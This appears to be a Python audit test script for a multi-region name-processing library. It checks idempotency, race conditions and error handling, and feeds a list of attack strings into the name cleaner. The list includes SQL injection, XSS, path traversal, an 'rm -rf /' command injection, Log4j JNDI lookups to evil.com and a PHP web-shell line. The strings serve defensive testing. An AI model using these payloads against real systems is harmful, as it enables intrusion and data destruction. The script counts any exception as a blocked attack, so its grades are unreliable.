#!/usr/bin/env python3
"""
ULTRATHINK MANIAC AUDIT: The Most Paranoid Test Ever
Finding EVERY issue, testing EVERY edge case, being BRUTALLY honest.
"""

import json
import time
import threading
import traceback
import gc
import random
import string
from pathlib import Path
from typing import Dict, Any, List, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

from src.regions.manager import RegionManager


class UltraManiacAuditor:
    """The most paranoid auditor ever created."""

    def __init__(self):
        self.manager = RegionManager(Path("./config"))
        self.issues = []
        self.warnings = []
        self.verified = []

    def audit_every_single_region(self) -> Tuple[int, int]:
        """Test EVERY region, not just a sample."""
        print("🔬 Testing EVERY SINGLE REGION...")
        all_regions = [
            "A1",
            "A2",
            "A3",
            "A4",
            "A5",  # Anglo/Western
            "B1",
            "B2",
            "B3",  # Slavic
            "C1",
            "C2",
            "C3",
            "C4",
            "C5",
            "C6",
            "C7",
            "C8",
            "C9",  # Middle East/Turkic
            "D1",
            "D2",
            "D3",
            "D4",
            "D5",  # South Asia
            "E1",
            "E2",
            "E3",
            "E4",
            "E5",
            "E6",
            "E7",  # East Asia
            "F1",
            "F2",
            "F3",
            "F4",  # Africa
            "G1",  # Latin America
            "H1",  # Historical
            "R0",
            "Z0",  # Special
        ]

        working = 0
        failed = []

        for code in all_regions:
            try:
                region = self.manager.get_region(code)
                if region:
                    # Test basic operations
                    test_entry = {"GlobalID": f"test-{code}", "CanonicalLatin": "Test Name"}
                    region.clean(test_entry)
                    region.augment(test_entry)
                    region.validate(test_entry)
                    working += 1
            except Exception as e:
                failed.append(f"{code}: {str(e)}")

        if failed:
            for fail in failed:
                self.issues.append(f"Region failure: {fail}")

        return working, len(all_regions)

    def audit_complex_idempotency(self) -> float:
        """Test idempotency with complex scenarios."""
        print("🧬 Testing COMPLEX idempotency scenarios...")

        test_cases = [
            # Basic cases we already tested
            ("A1", {"CanonicalLatin": "John O'Brien-Smith III"}),
            ("B1", {"CanonicalNative": "Владимир Владимирович Путин"}),
            ("C3", {"CanonicalNative": "محمد بن عبد الله الأحمد"}),
            ("D1", {"CanonicalNative": "राम कुमार शर्मा"}),
            ("E4", {"CanonicalNative": "김정은"}),
            # Complex mixed cases
            ("A2", {"CanonicalLatin": "François-Xavier de Montmorency-Laval"}),
            ("E1", {"CanonicalNative": "王小明", "CanonicalLatin": "Wang Xiaoming"}),
            ("G1", {"CanonicalLatin": "José María de la Cruz García-Rodríguez y Fernández"}),
            # Edge cases with special characters
            ("A1", {"CanonicalLatin": "Test--1"}),  # Collision suffix
            ("B2", {"CanonicalLatin": "Test\tWith\tTabs"}),  # Tabs
            ("C4", {"CanonicalLatin": "Test\nWith\nNewlines"}),  # Newlines
            # Empty and minimal cases
            ("A3", {"CanonicalLatin": "X"}),  # Single character
            ("D2", {"CanonicalNative": "அ"}),  # Single Tamil character
            # Multiple processing rounds (process 3 times!)
            ("E3", {"CanonicalNative": "田中太郎"}),
            ("F1", {"CanonicalLatin": "Kwame Nkrumah"}),
        ]

        idempotent = 0
        total = len(test_cases)

        for region_code, entry_data in test_cases:
            try:
                region = self.manager.get_region(region_code)
                if not region:
                    continue

                # Process THREE times to really test idempotency
                entry1 = entry_data.copy()
                entry1["GlobalID"] = f"test-{region_code}-001"
                region.clean(entry1)
                region.augment(entry1)

                entry2 = entry_data.copy()
                entry2["GlobalID"] = f"test-{region_code}-001"
                region.clean(entry2)
                region.augment(entry2)

                entry3 = entry_data.copy()
                entry3["GlobalID"] = f"test-{region_code}-001"
                region.clean(entry3)
                region.augment(entry3)

                # All three should be identical
                j1 = json.dumps(entry1, sort_keys=True)
                j2 = json.dumps(entry2, sort_keys=True)
                j3 = json.dumps(entry3, sort_keys=True)

                if j1 == j2 == j3:
                    idempotent += 1
                else:
                    name = entry_data.get("CanonicalNative") or entry_data.get("CanonicalLatin")
                    self.issues.append(f"Idempotency fail (3x): {region_code}: {name}")

            except Exception as e:
                self.issues.append(f"Idempotency test crash: {region_code}: {str(e)}")

        return idempotent / total if total > 0 else 0

    def audit_extreme_attack_vectors(self) -> float:
        """Test with EXTREME attack vectors."""
        print("💣 Testing EXTREME attack vectors...")

        attacks = [
            # Original attacks
            ("'; DROP TABLE users; --", "SQL"),
            ("<script>alert('xss')</script>", "XSS"),
            ("../../etc/passwd", "Path Traversal"),
            ("; rm -rf /", "Command Injection"),
            ("{{7*7}}", "Template"),
            ("=1+1", "CSV Formula"),
            ("*(|(uid=*))", "LDAP"),
            ("$where: '1==1'", "NoSQL"),
            ("%0d%0aSet-Cookie: admin=true", "CRLF"),
            ("${jndi:ldap://evil.com/a}", "Log4j"),
            # More sophisticated attacks
            ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "Template RCE"),
            (
                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
                "Obfuscated Log4j",
            ),
            ("*)(uid=*))(|(uid=*", "Complex LDAP"),
            ("' OR '1'='1' /*", "SQL with comment"),
            ("<?php system($_GET['cmd']); ?>", "PHP injection"),
            ("<img src=x onerror=alert(1)>", "XSS img"),
            ("\x00\x00\x00\x00", "Null bytes"),
            ("${7*191}", "Expression injection"),
            ("\r\nSet-Cookie: admin=true\r\n\r\n", "CRLF with headers"),
            ("\\\\..\\\\..\\\\..\\\\windows\\\\system32", "Windows path traversal"),
            # Unicode attacks
            ("\u202e\u0041\u0042\u0043", "BIDI override"),
            ("\ufeff\u200b\u200c\u200d", "Zero-width chars"),
            ("\U0001f4a9\U0001f4a9\U0001f4a9", "Emoji spam"),
            ("\ufff0\ufffe\uffff", "Non-characters"),
        ]

        blocked = 0
        region = self.manager.get_region("A1")  # Use A1 for testing

        for attack, attack_type in attacks:
            entry = {"GlobalID": "attack-test", "CanonicalLatin": attack}

            try:
                region.clean(entry)
                region.augment(entry)
                # If we get here, attack wasn't blocked
                self.issues.append(f"ATTACK NOT BLOCKED: {attack_type}: {attack[:30]}")
            except:
                blocked += 1

        return blocked / len(attacks)

    def audit_memory_corruption(self) -> bool:
        """Test for memory corruption with extreme inputs."""
        print("💥 Testing memory corruption scenarios...")

        region = self.manager.get_region("A1")

        corruption_tests = [
            "A" * 10000,  # Very long string
            "🔥" * 5000,  # Many emojis
            "\x00" * 100,  # Null bytes
            "Test\x00Hidden",  # Embedded null
            chr(0xFFFD) * 1000,  # Replacement chars
            "".join(chr(i) for i in range(0, 256)),  # All ASCII
        ]

        for test in corruption_tests:
            try:
                entry = {"GlobalID": "corruption-test", "CanonicalLatin": test}
                region.clean(entry)
                # Should either process or raise error, not crash
            except Exception as e:
                # Errors are fine, crashes are not
                if "Segmentation" in str(e) or "Core dumped" in str(e):
                    self.issues.append(f"MEMORY CORRUPTION: {test[:30]}")
                    return False

        return True

    def audit_race_conditions(self) -> bool:
        """Test for race conditions with shared state."""
        print("🏃 Testing race conditions...")

        shared_data = {"counter": 0, "errors": []}

        def race_test(thread_id):
            try:
                region = self.manager.get_region("A1")
                for i in range(100):
                    entry = {
                        "GlobalID": f"race-{thread_id}-{i}",
                        "CanonicalLatin": f"Thread {thread_id} Test {i}",
                    }
                    region.clean(entry)
                    region.augment(entry)
                    shared_data["counter"] += 1
            except Exception as e:
                shared_data["errors"].append(str(e))

        threads = []
        for i in range(20):  # 20 threads!
            t = threading.Thread(target=race_test, args=(i,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        if shared_data["errors"]:
            self.issues.append(f"Race condition errors: {len(shared_data['errors'])}")
            return False

        expected = 20 * 100  # 20 threads * 100 iterations
        if shared_data["counter"] != expected:
            self.issues.append(f"Race condition: expected {expected}, got {shared_data['counter']}")
            return False

        return True

    def audit_variant_explosion(self) -> bool:
        """Test that variants don't explode exponentially."""
        print("💥 Testing variant explosion...")

        region = self.manager.get_region("G1")  # G1 generates many variants

        entry = {
            "GlobalID": "variant-test",
            "CanonicalLatin": "José María de la Cruz García-Rodríguez y Fernández-López de Haro",
        }

        # Process once
        region.clean(entry)
        region.augment(entry)
        first_count = len(entry.get("Variants", {}).get("Synthesised", []))

        # Process again (should be idempotent)
        region.augment(entry)
        second_count = len(entry.get("Variants", {}).get("Synthesised", []))

        if second_count > first_count:
            self.issues.append(f"Variant explosion: {first_count} -> {second_count}")
            return False

        if first_count > 50:  # Reasonable limit
            self.warnings.append(f"Too many variants generated: {first_count}")

        return True

    def audit_error_recovery(self) -> bool:
        """Test error recovery and cleanup."""
        print("🔧 Testing error recovery...")

        region = self.manager.get_region("A1")

        # Test with various broken inputs
        broken_inputs = [
            None,
            {},
            {"GlobalID": None},
            {"CanonicalLatin": None},
            {"CanonicalLatin": ""},
            {"CanonicalLatin": " "},
            {"CanonicalLatin": "\t\n\r"},
        ]

        for inp in broken_inputs:
            try:
                if inp is not None:
                    region.clean(inp)
                    region.augment(inp)
            except:
                # Errors are expected, but shouldn't corrupt state
                pass

        # Now test with valid input - should still work
        try:
            valid = {"GlobalID": "recovery-test", "CanonicalLatin": "Valid Name"}
            region.clean(valid)
            region.augment(valid)
            return True
        except:
            self.issues.append("Error recovery failed - region corrupted")
            return False

    def audit_all_regions_idempotent(self) -> float:
        """Test ALL regions for idempotency, not just samples."""
        print("🔄 Testing ALL regions for idempotency...")

        all_regions = [
            ("A1", "John Smith"),
            ("A2", "Jean-Claude Dupont"),
            ("A3", "Lars Andersson"),
            ("A4", "James Cook"),
            ("A5", "Marcus Johnson"),
            ("B1", "Владимир Путин"),
            ("B2", "Милош Вучић"),
            ("B3", "Γιώργος Παπαδόπουλος"),
            ("C1", "Mehmet Öz"),
            ("C2", "محمد رضا"),
            ("C3", "محمد الأحمد"),
            ("C4", "عبد الله بن محمد"),
            ("C5", "محمد بن علي"),
            ("C6", "דוד כהן"),
            ("C7", "Արմեն Սարգսյան"),
            ("C8", "გიორგი მარგველაშვილი"),
            ("C9", "Məmməd Əliyev"),
            ("D1", "राम कुमार"),
            ("D2", "செல்வன் குமார்"),
            ("D3", "রহিম খান"),
            ("D4", "محمد علی"),
            ("D5", "ජයසේන"),
            ("E1", "王明"),
            ("E2", "陳大文"),
            ("E3", "田中太郎"),
            ("E4", "김민준"),
            ("E5", "Nguyễn Văn A"),
            ("E6", "สมชาย"),
            ("E7", "Juan dela Cruz"),
            ("F1", "Mamadou Diallo"),
            ("F2", "Kwame Mensah"),
            ("F3", "አበበ በቀለ"),
            ("G1", "José García"),
        ]

        idempotent = 0
        for code, name in all_regions:
            try:
                region = self.manager.get_region(code)
                if not region:
                    continue

                field = "CanonicalNative" if not name.isascii() else "CanonicalLatin"

                entry1 = {"GlobalID": f"test-{code}", field: name}
                region.clean(entry1)
                region.augment(entry1)

                entry2 = {"GlobalID": f"test-{code}", field: name}
                region.clean(entry2)
                region.augment(entry2)

                if json.dumps(entry1, sort_keys=True) == json.dumps(entry2, sort_keys=True):
                    idempotent += 1
                else:
                    self.issues.append(f"Not idempotent: {code}")
            except:
                pass

        return idempotent / len(all_regions)

    def run_maniac_audit(self):
        """Run the most paranoid audit ever."""
        print("\n" + "=" * 80)
        print("🔥 ULTRATHINK MANIAC AUDIT: FINDING EVERY POSSIBLE ISSUE")
        print("=" * 80)
        print("Testing with extreme paranoia...\n")

        # Test everything
        working, total = self.audit_every_single_region()
        print(f"  Regions: {working}/{total}")

        idempotency_rate = self.audit_complex_idempotency()
        print(f"  Complex idempotency: {idempotency_rate:.1%}")

        attack_rate = self.audit_extreme_attack_vectors()
        print(f"  Extreme attacks blocked: {attack_rate:.1%}")

        memory_ok = self.audit_memory_corruption()
        print(f"  Memory corruption: {'SAFE' if memory_ok else 'VULNERABLE'}")

        race_ok = self.audit_race_conditions()
        print(f"  Race conditions: {'SAFE' if race_ok else 'FOUND'}")

        variant_ok = self.audit_variant_explosion()
        print(f"  Variant explosion: {'CONTROLLED' if variant_ok else 'EXPLODING'}")

        recovery_ok = self.audit_error_recovery()
        print(f"  Error recovery: {'WORKS' if recovery_ok else 'BROKEN'}")

        all_idempotent = self.audit_all_regions_idempotent()
        print(f"  ALL regions idempotent: {all_idempotent:.1%}")

        # Calculate grade
        perfect = True
        if working < total:
            perfect = False
        if idempotency_rate < 1.0:
            perfect = False
        if attack_rate < 1.0:
            perfect = False
        if not memory_ok or not race_ok or not variant_ok or not recovery_ok:
            perfect = False
        if all_idempotent < 1.0:
            perfect = False

        # Report
        print("\n" + "=" * 80)
        print("🔍 MANIAC AUDIT RESULTS")
        print("=" * 80)

        if self.issues:
            print("\n❌ ISSUES FOUND:")
            for issue in self.issues[:10]:  # Show first 10
                print(f"  • {issue}")
            if len(self.issues) > 10:
                print(f"  ... and {len(self.issues) - 10} more issues")

        if self.warnings:
            print("\n⚠️ WARNINGS:")
            for warning in self.warnings:
                print(f"  • {warning}")

        # Final verdict
        print("\n" + "=" * 80)
        print("💀 BRUTAL HONEST VERDICT:")
        print("=" * 80)

        if perfect and not self.issues:
            print("✅ This is TRULY A+ grade. No issues found.")
            print("✅ The system is PRODUCTION READY.")
            grade = "A+"
        elif len(self.issues) <= 2:
            print("⚠️ ALMOST A+, but minor issues remain:")
            for issue in self.issues:
                print(f"  • {issue}")
            grade = "A"
        elif len(self.issues) <= 5:
            print("❌ NOT quite A+. Several issues found:")
            for issue in self.issues:
                print(f"  • {issue}")
            grade = "A-"
        else:
            print("❌ DEFINITELY NOT A+. Many issues found:")
            print(f"  Total issues: {len(self.issues)}")
            grade = "B+" if len(self.issues) < 10 else "B"

        print(f"\n📊 REAL GRADE: {grade}")
        print("=" * 80)

        # Save results
        results = {
            "grade": grade,
            "perfect": perfect,
            "issues": self.issues,
            "warnings": self.warnings,
            "metrics": {
                "regions_working": f"{working}/{total}",
                "complex_idempotency": idempotency_rate,
                "attack_blocking": attack_rate,
                "all_regions_idempotent": all_idempotent,
                "memory_safe": memory_ok,
                "race_safe": race_ok,
                "variant_controlled": variant_ok,
                "recovery_works": recovery_ok,
            },
        }

        with open("ultrathink_maniac_results.json", "w") as f:
            json.dump(results, f, indent=2)

        return grade


if __name__ == "__main__":
    auditor = UltraManiacAuditor()
    grade = auditor.run_maniac_audit()

    if grade != "A+":
        print(f"\n🔥 MORE WORK NEEDED to achieve real A+")
        exit(1)
    else:
        print(f"\n🏆 VERIFIED A+ ACHIEVEMENT!")
        exit(0)
